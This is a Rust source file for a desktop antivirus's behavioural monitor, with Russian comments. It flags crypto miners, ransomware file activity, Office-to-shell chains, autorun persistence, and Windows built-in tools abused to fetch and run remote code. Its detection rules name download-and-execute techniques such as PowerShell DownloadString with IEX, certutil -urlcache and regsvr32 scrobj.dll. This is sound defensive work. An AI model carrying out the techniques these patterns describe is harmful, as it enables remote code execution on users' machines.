//! Поведенческая защита: фоновый монитор, который следит не за «что за файл», а за «что он делает».
//!
//! Сигналы (правила в `Evaluator`, не зависят от ОС и покрыты тестами):
//!   • майнер: процесс без подписи держит заметную нагрузку на процессор минуты подряд, особенно с соединением на порт пула;
//!   • запуск неподписанной программы из Temp/Загрузок/Public;
//!   • приёмы вирусов: PowerShell скачивает и запускает код, загрузка и запуск из сети через certutil/bitsadmin/mshta/regsvr32;
//!   • цепочки «Word/Excel/PDF → cmd/PowerShell/wscript»;
//!   • новые записи автозапуска из временных папок или с приёмами из предыдущего пункта;
//!   • шифровальщик: массовое переименование файлов в Документах/Рабочем столе/Изображениях, файлы с «выкупными» расширениями.
//! Монитор только предупреждает (событие `bh-alert` + журнал); завершить процесс или добавить в доверенные решает пользователь.
//! Работает в пользовательском режиме, пока запущена программа: драйвера ядра у нас нет, поэтому полной защиты Защитника не заменит.

use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use std::collections::{HashMap, HashSet, VecDeque};
use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Mutex;
use std::time::{Duration, Instant};
use sysinfo::{ProcessRefreshKind, ProcessesToUpdate, System, UpdateKind};
use tauri::{AppHandle, Emitter, Manager};

const SAMPLE_SECS: u64 = 5;
/// Окно усреднения нагрузки: 36 выборок × 5 с = 3 минуты.
const CPU_WINDOW: usize = 36;
const CPU_ALERT_PERCENT: f32 = 25.0; // от всего процессора
const NET_EVERY: u64 = 3; // раз в 3 выборки (15 с)
const AUTORUN_EVERY: u64 = 24; // раз в 2 минуты
const MAX_SIGCHECKS_PER_CYCLE: usize = 2;
/// Одно и то же правило по одной и той же программе — не чаще раза в 10 минут. id тревоги содержит PID, а
/// у каждого запуска он новый: без паузы скрипт, который запускает одну и ту же утилиту в цикле, давал тост на каждый вызов.
const REPEAT_SECS: u64 = 600;

static RUNNING: AtomicBool = AtomicBool::new(false);
static STOP: AtomicBool = AtomicBool::new(false);
/// Выставляется при смене настроек в интерфейсе: монитор перечитывает их на следующей же выборке, а не раз в минуту.
static DIRTY: AtomicBool = AtomicBool::new(true);
static ALERTS: Mutex<Vec<Alert>> = Mutex::new(Vec::new());

// ------------------------------------------------------------------ модель

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct Alert {
    pub id: String,
    pub at: u64,
    pub severity: String, // critical | high | medium | low
    pub rule: String,
    pub title: String,
    pub detail: String,
    pub pid: Option<u64>,
    pub name: String,
    pub path: Option<String>,
}

/// Снимок процесса, на который смотрят правила.
#[derive(Clone, Debug, Default)]
pub struct Sample {
    pub pid: u64,
    pub name: String,
    pub exe: String,
    pub cmd: String,
    pub parent_name: String,
    /// Нагрузка в процентах от ВСЕГО процессора (не от одного ядра).
    pub cpu_total: f32,
    pub is_new: bool,
    pub pool_conn: Option<String>,
}

#[derive(Serialize, Deserialize, Default, Clone)]
struct Settings {
    #[serde(default = "yes")]
    enabled: bool,
    #[serde(default)]
    trusted: Vec<String>, // пути и имена процессов, которым пользователь доверяет
    /// Защита файлов в реальном времени: новые файлы в Загрузках, на Рабочем столе, в Temp и автозагрузке проверяются сразу.
    #[serde(default = "yes")]
    realtime: bool,
    /// Найденный по базе вредоносный файл сразу уходит в карантин (иначе — только предупреждение).
    #[serde(default = "yes")]
    auto_quarantine: bool,
    /// Правила, которые пользователь выключил (miner-cpu, ransomware, lolbin, …).
    #[serde(default)]
    disabled_rules: Vec<String>,
}

fn yes() -> bool {
    true
}

fn now_secs() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0)
}

fn lower(s: &str) -> String {
    s.to_lowercase().replace('/', "\\")
}

fn stem(name: &str) -> String {
    let l = name.to_lowercase();
    l.strip_suffix(".exe").unwrap_or(&l).to_string()
}

// ----------------------------------------------------------------- правила

const OFFICE: &[&str] = &["winword", "excel", "powerpnt", "outlook", "acrord32", "acrobat", "onenote", "msaccess"];
const SHELLS: &[&str] = &["cmd", "powershell", "pwsh", "wscript", "cscript", "mshta", "rundll32", "regsvr32"];
const SUSPICIOUS_DIRS: &[&str] = &["\\appdata\\local\\temp\\", "\\windows\\temp\\", "\\users\\public\\", "\\downloads\\", "\\appdata\\roaming\\"];
/// Программы, которые законно грузят процессор и ходят на «пуловые» порты: для правила нагрузки их не трогаем.
const HEAVY_OK: &[&str] = &[
    "system", "idle", "msmpeng", "mpdefendercoreservice", "searchindexer", "dwm", "explorer", "svchost", "audiodg", "wmiprvse",
    "chrome", "msedge", "firefox", "brave", "opera", "vivaldi", "steam", "steamwebhelper", "epicgameslauncher", "discord", "slack",
    "teams", "zoom", "obs64", "obs", "ffmpeg", "handbrake", "blender", "vlc", "mpv", "code", "devenv", "node", "java", "javaw",
    "python", "cargo", "rustc", "cl", "link", "msbuild", "dotnet", "7z", "7zg", "winrar", "project-desktop", "msedgewebview2",
];

pub fn in_suspicious_dir(path: &str) -> bool {
    let l = lower(path);
    SUSPICIOUS_DIRS.iter().any(|d| l.contains(d))
}

/// Приёмы, по которым вирусы запускают код через штатные утилиты Windows.
pub fn lolbin_abuse(name: &str, cmd: &str) -> Option<&'static str> {
    let n = stem(name);
    let c = cmd.to_lowercase();
    let has = |s: &str| c.contains(s);
    match n.as_str() {
        "powershell" | "pwsh" => {
            // Голый -EncodedCommand не считаем признаком: так штатно запускают команды Claude Code, установщики и
            // инструменты разработчика — правило давало только ложные тревоги. Загрузку и раскодирование ловят правила ниже.
            if (has("downloadstring") || has("downloadfile") || has("invoke-webrequest") || has("iwr ")) && (has("iex") || has("invoke-expression") || has("start-process")) {
                Some("PowerShell скачивает и сразу запускает код из сети")
            } else if (has("-windowstyle hidden") || has("-w hidden") || has("-nop")) && (has("http") || has("frombase64string")) {
                Some("PowerShell в скрытом окне загружает или раскодирует данные")
            } else {
                None
            }
        }
        "certutil" if has("-urlcache") || has("-verifyctl") && has("http") => Some("certutil скачивает файл из сети"),
        "bitsadmin" if has("/transfer") && has("http") => Some("bitsadmin скачивает файл из сети"),
        "mshta" if has("http") || has("vbscript:") || has("javascript:") => Some("mshta запускает скрипт из сети"),
        "regsvr32" if has("/i:http") || has("scrobj.dll") => Some("regsvr32 запускает удалённый скрипт"),
        "rundll32" if has("javascript:") || has("mshtml,runhtmlapplication") => Some("rundll32 запускает скрипт"),
        "wscript" | "cscript" if has("http://") || has("https://") => Some("Скрипт-хост обращается к сети"),
        _ => None,
    }
}

pub fn office_spawn(parent: &str, child: &str) -> bool {
    OFFICE.contains(&stem(parent).as_str()) && SHELLS.contains(&stem(child).as_str())
}

pub fn ransom_extension(ext: &str) -> bool {
    const EXT: &[&str] = &[
        "locked", "encrypted", "crypt", "crypted", "enc", "lockbit", "ryuk", "conti", "wncry", "wnry", "cerber", "locky", "zepto",
        "djvu", "stop", "akira", "blackcat", "hive", "royal", "basta", "babyk", "phobos", "dharma", "makop", "ransom",
    ];
    EXT.contains(&ext.to_lowercase().trim_start_matches('.'))
}

pub fn ransom_note(name: &str) -> bool {
    let n = name.to_lowercase();
    ["how_to_decrypt", "how_to_recover", "decrypt_instructions", "readme_to_decrypt", "restore_files", "your_files_are", "recover_your_files", "!!!_read_me", "_readme.txt"]
        .iter()
        .any(|p| n.contains(p))
}

/// Группы защиты в интерфейсе → правила монитора.
pub fn rules_of_group(group: &str) -> &'static [&'static str] {
    match group {
        "miner" => &["miner-cpu"],
        "ransomware" => &["ransomware"],
        "network" => &["c2"],
        "scripts" => &["lolbin", "office-spawn", "unsigned-temp", "persistence"],
        _ => &[],
    }
}

fn alert(rule: &str, severity: &str, title: String, detail: String, s: &Sample) -> Alert {
    Alert {
        id: format!("{rule}:{}:{}", s.pid, if s.exe.is_empty() { &s.name } else { &s.exe }),
        at: now_secs(),
        severity: severity.into(),
        rule: rule.into(),
        title,
        detail,
        pid: Some(s.pid),
        name: s.name.clone(),
        path: if s.exe.is_empty() { None } else { Some(s.exe.clone()) },
    }
}

/// Оценщик: хранит скользящую нагрузку по процессам и кэш подписей; сам ничего не запускает.
#[derive(Default)]
pub struct Evaluator {
    cpu: HashMap<u64, VecDeque<f32>>,
    /// exe → подписан ли (true = подпись Windows подтверждена). Нет записи — ещё не проверяли.
    pub signed: HashMap<String, bool>,
    fired: HashSet<String>,
    /// «правило:программа» → когда последний раз показали (см. REPEAT_SECS).
    last_shown: HashMap<String, u64>,
    pub trusted: HashSet<String>,
}

impl Evaluator {
    fn is_trusted(&self, s: &Sample) -> bool {
        let exe = lower(&s.exe);
        self.trusted.contains(&exe) || self.trusted.contains(&stem(&s.name))
    }

    fn once(&mut self, a: Alert) -> Option<Alert> {
        if !self.fired.insert(a.id.clone()) {
            return None;
        }
        let key = format!("{}:{}", a.rule, a.path.as_deref().map(lower).unwrap_or_else(|| stem(&a.name)));
        match self.last_shown.get(&key) {
            Some(&t) if a.at.saturating_sub(t) < REPEAT_SECS => None,
            _ => {
                self.last_shown.insert(key, a.at);
                Some(a)
            }
        }
    }

    /// Какие процессы стоит проверить на подпись (нужна для решений ниже): сильно нагружающие или новые из подозрительных папок.
    pub fn needs_signature(&self, s: &Sample) -> bool {
        if s.exe.is_empty() || self.signed.contains_key(&lower(&s.exe)) || self.is_trusted(s) {
            return false;
        }
        let heavy = self.cpu.get(&s.pid).map(|w| w.len() >= CPU_WINDOW / 2 && avg(w) >= CPU_ALERT_PERCENT * 0.8).unwrap_or(false);
        (s.is_new && in_suspicious_dir(&s.exe)) || heavy
    }

    pub fn evaluate(&mut self, s: &Sample) -> Vec<Alert> {
        let mut out = Vec::new();
        if self.is_trusted(s) {
            return out;
        }
        let w = self.cpu.entry(s.pid).or_default();
        w.push_back(s.cpu_total);
        while w.len() > CPU_WINDOW {
            w.pop_front();
        }
        let avg_cpu = avg(w);
        let full_window = w.len() >= CPU_WINDOW;
        let signed = self.signed.get(&lower(&s.exe)).copied();

        // 1. Приёмы вирусов через штатные утилиты.
        if let Some(why) = lolbin_abuse(&s.name, &s.cmd) {
            if let Some(a) = self.once(alert("lolbin", "high", format!("Подозрительный запуск: {}", s.name), why.into(), s)) {
                out.push(a);
            }
        }
        // 2. Документ запустил оболочку.
        if office_spawn(&s.parent_name, &s.name) {
            let a = alert("office-spawn", "high", format!("{} запущен из {}", s.name, s.parent_name), "Офисная программа или PDF-читалка не должна запускать командную оболочку — так работают вредоносные документы.".into(), s);
            if let Some(a) = self.once(a) {
                out.push(a);
            }
        }
        // 3. Неподписанная программа из временной папки/Загрузок.
        if s.is_new && in_suspicious_dir(&s.exe) && signed == Some(false) {
            let sev = if s.pool_conn.is_some() { "high" } else { "medium" };
            let a = alert("unsigned-temp", sev, format!("Неподписанная программа запущена из временной папки: {}", s.name), "Программа без цифровой подписи стартовала из папки, откуда обычно запускаются вирусы и загрузчики.".into(), s);
            if let Some(a) = self.once(a) {
                out.push(a);
            }
        }
        // 4. Майнер: постоянная нагрузка + нет подписи (подписанные программы — игры, редакторы — считаем нормой).
        let name_ok = HEAVY_OK.contains(&stem(&s.name).as_str());
        if full_window && avg_cpu >= CPU_ALERT_PERCENT && !name_ok && signed == Some(false) {
            let mut why = format!("Процесс без подписи держит нагрузку на процессор около {:.0}% уже 3 минуты.", avg_cpu);
            let mut sev = "medium";
            if let Some(c) = &s.pool_conn {
                why.push_str(&format!(" Соединение с {c} — типичный порт майнинг-пула."));
                sev = "high";
            }
            if in_suspicious_dir(&s.exe) {
                why.push_str(" Запущен из временной или пользовательской папки.");
                sev = "high";
            }
            let a = alert("miner-cpu", sev, format!("Похоже на майнер: {}", s.name), why, s);
            if let Some(a) = self.once(a) {
                out.push(a);
            }
        }
        out
    }

    /// true, если такой сигнал ещё не поднимали (чтобы одно соединение не шумело каждые 15 секунд).
    pub fn fired_once(&mut self, id: &str) -> bool {
        self.fired.insert(id.to_string())
    }

    pub fn forget(&mut self, alive: &HashSet<u64>) {
        self.cpu.retain(|pid, _| alive.contains(pid));
    }
}

fn avg(w: &VecDeque<f32>) -> f32 {
    if w.is_empty() {
        0.0
    } else {
        w.iter().sum::<f32>() / w.len() as f32
    }
}

// ----------------------------------------------------------- шифровальщик

/// Считает изменения файлов в окне 10 с и решает, похоже ли это на шифровальщика.
#[derive(Default)]
pub struct RansomWatch {
    window: VecDeque<(Instant, String, bool)>, // (когда, путь, было переименование в чужое расширение)
}

impl RansomWatch {
    pub fn push(&mut self, path: &str, renamed_to_new_ext: bool, now: Instant) -> Option<(&'static str, String)> {
        let name = Path::new(path).file_name().map(|n| n.to_string_lossy().to_string()).unwrap_or_default();
        let ext = Path::new(path).extension().map(|e| e.to_string_lossy().to_string()).unwrap_or_default();
        if ransom_note(&name) {
            return Some(("critical", format!("Появился файл-требование выкупа: {name}")));
        }
        if !ext.is_empty() && ransom_extension(&ext) {
            return Some(("critical", format!("Файлы получают расширение шифровальщика: .{ext}")));
        }
        self.window.push_back((now, path.to_string(), renamed_to_new_ext));
        while self.window.front().map(|(t, _, _)| now.duration_since(*t) > Duration::from_secs(10)).unwrap_or(false) {
            self.window.pop_front();
        }
        let renames: HashSet<&str> = self.window.iter().filter(|(_, _, r)| *r).map(|(_, p, _)| p.as_str()).collect();
        if renames.len() >= 40 {
            return Some(("high", format!("За 10 секунд переименовано {} файлов — похоже на шифровальщика", renames.len())));
        }
        None
    }
}

// ----------------------------------------------------------- ОС-часть

fn data_dir(app: &AppHandle) -> Option<PathBuf> {
    let d = app.path().app_data_dir().ok()?.join("av");
    fs::create_dir_all(&d).ok()?;
    Some(d)
}

fn load_settings(app: &AppHandle) -> Settings {
    data_dir(app)
        .and_then(|d| fs::read_to_string(d.join("behavior.json")).ok())
        .and_then(|t| serde_json::from_str(&t).ok())
        .unwrap_or_else(|| Settings { enabled: true, trusted: vec![], realtime: true, auto_quarantine: true, disabled_rules: vec![] })
}

fn save_settings(app: &AppHandle, s: &Settings) {
    if let Some(d) = data_dir(app) {
        let _ = fs::write(d.join("behavior.json"), serde_json::to_vec(s).unwrap_or_default());
    }
}

fn load_alerts(app: &AppHandle) {
    if let Some(list) = data_dir(app).and_then(|d| fs::read_to_string(d.join("behavior_alerts.json")).ok()).and_then(|t| serde_json::from_str::<Vec<Alert>>(&t).ok()) {
        if let Ok(mut g) = ALERTS.lock() {
            *g = list;
        }
    }
}

fn record(app: &AppHandle, a: Alert) {
    if let Ok(mut g) = ALERTS.lock() {
        g.retain(|x| x.id != a.id);
        g.insert(0, a.clone());
        g.truncate(200);
        if let Some(d) = data_dir(app) {
            let _ = fs::write(d.join("behavior_alerts.json"), serde_json::to_vec(&*g).unwrap_or_default());
        }
    }
    let _ = app.emit("bh-alert", serde_json::to_value(&a).unwrap_or(Value::Null));
}

fn powershell(script: &str) -> Option<String> {
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        let full = format!("[Console]::OutputEncoding=[Text.UTF8Encoding]::new(); $ProgressPreference='SilentlyContinue'; {script}");
        let out = Command::new("powershell")
            .args(["-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command", &full])
            .creation_flags(0x0800_0000)
            .output()
            .ok()?;
        Some(String::from_utf8_lossy(&out.stdout).to_string())
    }
    #[cfg(not(windows))]
    {
        let _ = script;
        None
    }
}

/// Подписан ли файл действительной подписью Authenticode.
fn is_signed(path: &str) -> bool {
    let p = crate::antivirus::ps_quote(path);
    powershell(&format!("(Get-AuthenticodeSignature -LiteralPath '{p}').Status"))
        .map(|s| s.trim() == "Valid")
        .unwrap_or(true) // не смогли проверить — не обвиняем
}

/// pid → «ip:порт» для соединений на порты майнинг-пулов.
fn pool_connections() -> HashMap<u64, String> {
    let mut map = HashMap::new();
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        let ports: [&str; 7] = [":3333", ":4444", ":5555", ":7777", ":14433", ":14444", ":45560"];
        if let Ok(out) = Command::new("netstat").args(["-ano", "-p", "tcp"]).creation_flags(0x0800_0000).output() {
            for line in String::from_utf8_lossy(&out.stdout).lines() {
                let cols: Vec<&str> = line.split_whitespace().collect();
                if cols.len() >= 5 && cols[3] == "ESTABLISHED" && !cols[2].starts_with("127.") && ports.iter().any(|p| cols[2].ends_with(p)) {
                    if let Ok(pid) = cols[4].parse::<u64>() {
                        map.insert(pid, cols[2].to_string());
                    }
                }
            }
        }
    }
    map
}

/// pid → «ip:порт» для соединений с адресами из списка управляющих серверов.
fn c2_connections(bad: &HashSet<String>) -> HashMap<u64, String> {
    let mut map = HashMap::new();
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        if bad.is_empty() {
            return map;
        }
        if let Ok(out) = Command::new("netstat").args(["-ano", "-p", "tcp"]).creation_flags(0x0800_0000).output() {
            for line in String::from_utf8_lossy(&out.stdout).lines() {
                let cols: Vec<&str> = line.split_whitespace().collect();
                if cols.len() >= 5 && cols[3] == "ESTABLISHED" {
                    let remote_ip = cols[2].rsplit_once(':').map(|(ip, _)| ip).unwrap_or("");
                    if bad.contains(remote_ip) {
                        if let Ok(pid) = cols[4].parse::<u64>() {
                            map.insert(pid, cols[2].to_string());
                        }
                    }
                }
            }
        }
    }
    #[cfg(not(windows))]
    {
        let _ = bad;
    }
    map
}

fn autorun_snapshot() -> HashSet<String> {
    let script = "$r=@(); foreach($h in 'HKCU','HKLM'){ foreach($k in 'Run','RunOnce'){ $p=\"${h}:\\Software\\Microsoft\\Windows\\CurrentVersion\\$k\"; if(Test-Path $p){ $o=Get-ItemProperty $p; foreach($n in $o.PSObject.Properties){ if($n.Name -notlike 'PS*'){ $r+=\"$h|$($n.Name)|$([string]$n.Value)\" } } } } }; try { Get-ScheduledTask -ErrorAction Stop | ForEach-Object { foreach($a in $_.Actions){ if($a.Execute){ $r+=\"TASK|$($_.TaskName)|$($a.Execute) $($a.Arguments)\" } } } } catch {}; $r | ConvertTo-Json -Compress";
    let mut set = HashSet::new();
    if let Some(text) = powershell(script) {
        match serde_json::from_str::<Value>(text.trim()) {
            Ok(Value::Array(a)) => set.extend(a.iter().filter_map(|v| v.as_str().map(String::from))),
            Ok(Value::String(s)) => {
                set.insert(s);
            }
            _ => {}
        }
    }
    set
}

fn monitor(app: AppHandle) {
    let mut settings = load_settings(&app);
    let mut ev = Evaluator::default();
    ev.trusted = settings.trusted.iter().map(|t| lower(t)).collect();
    let mut sys = System::new();
    let kind = ProcessRefreshKind::nothing().with_cpu().with_exe(UpdateKind::OnlyIfNotSet).with_cmd(UpdateKind::OnlyIfNotSet);
    sys.refresh_processes_specifics(ProcessesToUpdate::All, true, kind);
    let cores = std::thread::available_parallelism().map(|n| n.get()).unwrap_or(1) as f32;
    let started: HashSet<u64> = sys.processes().keys().map(|p| p.as_u32() as u64).collect();
    let mut seen: HashSet<u64> = started.clone();
    let mut pools: HashMap<u64, String> = HashMap::new();
    let mut bad_ips: HashSet<String> = crate::antivirus::bad_ip_set(&app);
    let mut c2: HashMap<u64, String> = HashMap::new();
    let mut autorun = autorun_snapshot();
    let own_pid = std::process::id() as u64;

    // Файловый наблюдатель за пользовательскими папками (шифровальщик).
    let (tx, rx) = std::sync::mpsc::channel::<notify::Result<notify::Event>>();
    let mut watcher = notify::recommended_watcher(tx).ok();
    if let Some(w) = watcher.as_mut() {
        use notify::{RecursiveMode, Watcher};
        if let Ok(profile) = std::env::var("USERPROFILE") {
            for sub in ["Documents", "Desktop", "Pictures"] {
                let p = PathBuf::from(&profile).join(sub);
                if p.exists() {
                    let _ = w.watch(&p, RecursiveMode::Recursive);
                }
            }
        }
    }
    // Защита в реальном времени: новые исполняемые файлы там, куда обычно попадает чужое.
    let (rt_tx, rt_rx) = std::sync::mpsc::channel::<notify::Result<notify::Event>>();
    let mut rt_watcher = notify::recommended_watcher(rt_tx).ok();
    if let Some(w) = rt_watcher.as_mut() {
        use notify::{RecursiveMode, Watcher};
        let mut dirs: Vec<PathBuf> = Vec::new();
        if let Ok(profile) = std::env::var("USERPROFILE") {
            for sub in ["Downloads", "Desktop"] {
                dirs.push(PathBuf::from(&profile).join(sub));
            }
        }
        if let Ok(a) = std::env::var("APPDATA") {
            dirs.push(PathBuf::from(&a).join("Microsoft\\Windows\\Start Menu\\Programs\\Startup"));
        }
        if let Ok(l) = std::env::var("LOCALAPPDATA") {
            dirs.push(PathBuf::from(&l).join("Temp"));
        }
        dirs.push(PathBuf::from("C:\\Users\\Public"));
        for d in dirs {
            if d.exists() {
                let _ = w.watch(&d, RecursiveMode::Recursive);
            }
        }
    }
    let mut checker = crate::antivirus::Checker::new(&app);
    let mut pending: HashMap<String, (Instant, u64)> = HashMap::new(); // путь → (когда впервые увидели, размер)
    let mut ransom = RansomWatch::default();
    let mut last_ransom_alert = Instant::now() - Duration::from_secs(600);

    let mut tick: u64 = 0;
    while !STOP.load(Ordering::Relaxed) {
        std::thread::sleep(Duration::from_secs(SAMPLE_SECS));
        tick += 1;
        if tick % 12 == 0 || DIRTY.swap(false, Ordering::Relaxed) {
            settings = load_settings(&app);
            ev.trusted = settings.trusted.iter().map(|t| lower(t)).collect();
            if !settings.enabled && !settings.realtime {
                break;
            }
        }
        sys.refresh_processes_specifics(ProcessesToUpdate::All, true, kind);
        if tick % NET_EVERY == 0 {
            pools = pool_connections();
            c2 = c2_connections(&bad_ips);
        }
        if tick % 240 == 0 {
            bad_ips = crate::antivirus::bad_ip_set(&app); // базы могли обновиться
        }

        let mut alive = HashSet::new();
        let mut checks = 0usize;
        let mut to_emit: Vec<Alert> = Vec::new();
        let names: HashMap<u64, String> = sys.processes().iter().map(|(p, pr)| (p.as_u32() as u64, pr.name().to_string_lossy().to_string())).collect();
        for (pid, p) in sys.processes() {
            let pid = pid.as_u32() as u64;
            alive.insert(pid);
            if pid == own_pid || pid <= 4 {
                continue;
            }
            let name = p.name().to_string_lossy().to_string();
            let exe = p.exe().map(|e| e.to_string_lossy().to_string()).unwrap_or_default();
            let cmd = p.cmd().iter().map(|c| c.to_string_lossy().to_string()).collect::<Vec<_>>().join(" ");
            let parent_name = p.parent().and_then(|pp| names.get(&(pp.as_u32() as u64)).cloned()).unwrap_or_default();
            let sample = Sample {
                pid,
                name,
                exe,
                cmd,
                parent_name,
                cpu_total: p.cpu_usage() / cores,
                is_new: !seen.contains(&pid),
                pool_conn: pools.get(&pid).cloned(),
            };
            seen.insert(pid);
            if let Some(remote) = c2.get(&pid) {
                if settings.enabled {
                    let a = Alert {
                        id: format!("c2:{pid}:{remote}"),
                        at: now_secs(),
                        severity: "high".into(),
                        rule: "c2".into(),
                        title: format!("Соединение с известным управляющим сервером: {}", sample.name),
                        detail: format!("Адрес {remote} числится в списках серверов управления вредоносами. Завершите процесс и проверьте его файл."),
                        pid: Some(pid),
                        name: sample.name.clone(),
                        path: if sample.exe.is_empty() { None } else { Some(sample.exe.clone()) },
                    };
                    if ev.fired_once(&a.id) {
                        to_emit.push(a);
                    }
                }
            }
            if ev.needs_signature(&sample) && checks < MAX_SIGCHECKS_PER_CYCLE {
                checks += 1;
                let signed = is_signed(&sample.exe);
                ev.signed.insert(lower(&sample.exe), signed);
            }
            if settings.enabled {
                to_emit.extend(ev.evaluate(&sample));
            }
        }
        ev.forget(&alive);
        seen.retain(|p| alive.contains(p));

        // Новые записи автозапуска и планировщика.
        if settings.enabled && tick % AUTORUN_EVERY == 0 {
            let fresh = autorun_snapshot();
            for entry in fresh.difference(&autorun) {
                let parts: Vec<&str> = entry.splitn(3, '|').collect();
                if parts.len() < 3 {
                    continue;
                }
                let target = parts[2];
                let sus = in_suspicious_dir(target) && (lower(target).contains("\\temp\\") || lower(target).contains("\\public\\"));
                let lol = ["powershell", "mshta", "wscript", "cscript", "certutil", "bitsadmin", "regsvr32", "rundll32"].iter().find_map(|n| lolbin_abuse(n, target).map(|w| (*n, w)));
                if sus || lol.is_some() {
                    to_emit.push(Alert {
                        id: format!("persist:{entry}"),
                        at: now_secs(),
                        severity: "high".into(),
                        rule: "persistence".into(),
                        title: format!("Новая запись автозапуска: {}", parts[1]),
                        detail: lol.map(|(_, w)| w.to_string()).unwrap_or_else(|| "Программа из временной папки закрепилась в автозапуске или планировщике.".into()),
                        pid: None,
                        name: parts[1].to_string(),
                        path: Some(target.to_string()),
                    });
                }
            }
            autorun = fresh;
        }

        // Файловая активность.
        while let Ok(Ok(event)) = rx.try_recv() {
            use notify::event::{EventKind, ModifyKind, RenameMode};
            let renamed = matches!(event.kind, EventKind::Modify(ModifyKind::Name(RenameMode::Both | RenameMode::To)));
            for path in &event.paths {
                let p = path.to_string_lossy().to_string();
                let is_rename_to_new = renamed && path.extension().is_some();
                if settings.enabled && matches!(event.kind, EventKind::Create(_) | EventKind::Modify(_)) {
                    if let Some((sev, msg)) = ransom.push(&p, is_rename_to_new, Instant::now()) {
                        if last_ransom_alert.elapsed() > Duration::from_secs(300) {
                            last_ransom_alert = Instant::now();
                            to_emit.push(Alert {
                                id: format!("ransom:{}", now_secs() / 300),
                                at: now_secs(),
                                severity: sev.into(),
                                rule: "ransomware".into(),
                                title: "Возможен шифровальщик".into(),
                                detail: format!("{msg}. Если вы ничего такого не делали — отключите компьютер от сети и закройте подозрительные программы."),
                                pid: None,
                                name: "файлы".into(),
                                path: Some(p),
                            });
                        }
                    }
                }
            }
        }

        // Защита файлов в реальном времени: собираем новые файлы, через 2 с (когда запись закончилась) проверяем по базе.
        while let Ok(Ok(event)) = rt_rx.try_recv() {
            if matches!(event.kind, notify::EventKind::Create(_) | notify::EventKind::Modify(_)) {
                for path in &event.paths {
                    if crate::antivirus::is_scan_ext(path) && path.is_file() {
                        let key = path.to_string_lossy().to_string();
                        let size = fs::metadata(path).map(|m| m.len()).unwrap_or(0);
                        pending.entry(key).and_modify(|e| e.1 = size).or_insert((Instant::now(), size));
                    }
                }
            }
        }
        if settings.realtime {
            let ready: Vec<String> = pending
                .iter()
                .filter(|(p, (t, sz))| t.elapsed() >= Duration::from_secs(2) && fs::metadata(p.as_str()).map(|m| m.len() == *sz).unwrap_or(false))
                .map(|(p, _)| p.clone())
                .collect();
            for path in ready {
                pending.remove(&path);
                let Some(ch) = checker.as_mut() else { continue };
                if let Some(det) = ch.check(&path) {
                    let label = det.extra["label"].as_str().unwrap_or(&det.title).to_string();
                    let mut detail = det.detail.clone();
                    let mut moved = false;
                    if settings.auto_quarantine && det.severity == "high" {
                        match crate::antivirus::quarantine_path(&app, &path, None, Some(label.clone())) {
                            Ok(_) => {
                                moved = true;
                                detail = format!("{detail} Файл автоматически помещён в карантин.");
                            }
                            Err(e) => detail = format!("{detail} В карантин убрать не удалось: {e}"),
                        }
                    }
                    crate::antivirus::log_event(&app, "realtime", &format!("{} {label}", if moved { "Заблокировано:" } else { "Найдено:" }), &path);
                    to_emit.push(Alert {
                        id: format!("realtime:{path}"),
                        at: now_secs(),
                        severity: det.severity.clone(),
                        rule: "realtime".into(),
                        title: format!("{}: {label}", if moved { "Угроза заблокирована" } else { "Найден опасный файл" }),
                        detail,
                        pid: None,
                        name: Path::new(&path).file_name().map(|n| n.to_string_lossy().to_string()).unwrap_or_default(),
                        path: if moved { None } else { Some(path) },
                    });
                }
            }
            pending.retain(|_, (t, _)| t.elapsed() < Duration::from_secs(120));
        } else {
            pending.clear();
        }

        for a in to_emit {
            if settings.disabled_rules.iter().any(|r| *r == a.rule) {
                continue;
            }
            record(&app, a);
        }
    }
    drop(watcher);
    drop(rt_watcher);
    RUNNING.store(false, Ordering::Relaxed);
}

/// Запуск монитора, если он включён в настройках (вызывается при старте приложения).
pub fn start_if_enabled(app: AppHandle) {
    load_alerts(&app);
    if load_settings(&app).enabled {
        start(app);
    }
}

fn start(app: AppHandle) {
    if RUNNING.swap(true, Ordering::SeqCst) {
        return;
    }
    STOP.store(false, Ordering::SeqCst);
    std::thread::spawn(move || monitor(app));
}

// ------------------------------------------------------------------ команды

#[tauri::command]
pub fn bh_status(app: AppHandle) -> Value {
    let s = load_settings(&app);
    let off = |g: &str| rules_of_group(g).iter().all(|r| s.disabled_rules.iter().any(|d| d == r));
    json!({
        "enabled": s.enabled, "running": RUNNING.load(Ordering::Relaxed), "trusted": s.trusted,
        "realtime": s.realtime, "auto_quarantine": s.auto_quarantine,
        "miner": !off("miner"), "ransomware": !off("ransomware"), "scripts": !off("scripts"), "network": !off("network"),
    })
}

/// Переключатели защиты в интерфейсе: realtime, auto_quarantine, miner, ransomware, scripts.
#[tauri::command]
pub fn bh_set(app: AppHandle, key: String, value: bool) {
    let mut s = load_settings(&app);
    match key.as_str() {
        "realtime" => s.realtime = value,
        "auto_quarantine" => s.auto_quarantine = value,
        group @ ("miner" | "ransomware" | "scripts" | "network") => {
            for r in rules_of_group(group) {
                s.disabled_rules.retain(|d| d != r);
                if !value {
                    s.disabled_rules.push((*r).to_string());
                }
            }
        }
        _ => return,
    }
    save_settings(&app, &s);
    DIRTY.store(true, Ordering::Relaxed);
    // Монитор подхватывает настройки сразу; для включённой защиты запускаем, если он остановлен.
    if (s.realtime || s.enabled) && !RUNNING.load(Ordering::Relaxed) {
        start(app);
    }
}

#[tauri::command]
pub fn bh_set_enabled(app: AppHandle, enabled: bool) {
    let mut s = load_settings(&app);
    s.enabled = enabled;
    save_settings(&app, &s);
    DIRTY.store(true, Ordering::Relaxed);
    if enabled {
        start(app);
    } else {
        STOP.store(true, Ordering::SeqCst);
    }
}

#[tauri::command]
pub fn bh_alerts() -> Vec<Alert> {
    ALERTS.lock().map(|g| g.clone()).unwrap_or_default()
}

#[tauri::command]
pub fn bh_dismiss(app: AppHandle, id: Option<String>) {
    if let Ok(mut g) = ALERTS.lock() {
        match id {
            Some(id) => g.retain(|a| a.id != id),
            None => g.clear(),
        }
        if let Some(d) = data_dir(&app) {
